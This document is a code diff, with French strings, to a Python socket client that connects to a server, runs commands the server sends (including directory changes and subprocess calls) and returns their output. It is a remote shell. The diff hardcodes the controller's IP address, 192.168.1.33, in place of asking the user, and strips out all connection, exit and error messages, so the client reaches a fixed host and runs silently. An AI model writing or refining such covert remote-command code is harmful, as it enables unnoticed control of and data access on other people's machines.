@@ -29,12 +29,11 @@ def receive_data(socket):
     return ""
 
 def start_client():
-    host = input("Entrez ip serveur: ")  # Adresse IP du serveur
+    host = "192.168.1.33"
     port = 12345
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
-    print(f"Connecté au serveur {host}:{port}")
 
     while True:
         try:
@@ -43,7 +42,6 @@ def start_client():
                 break
 
             if command == "exit":
-                print("Fermeture de la connexion.")
                 break
 
             elif command.startswith("cd "):
@@ -84,7 +82,6 @@ def start_client():
                     send_data(client_socket, f"Erreur : {e.output}")
 
         except Exception as e:
-            print(f"Erreur : {e}")
             break
 
     client_socket.close()
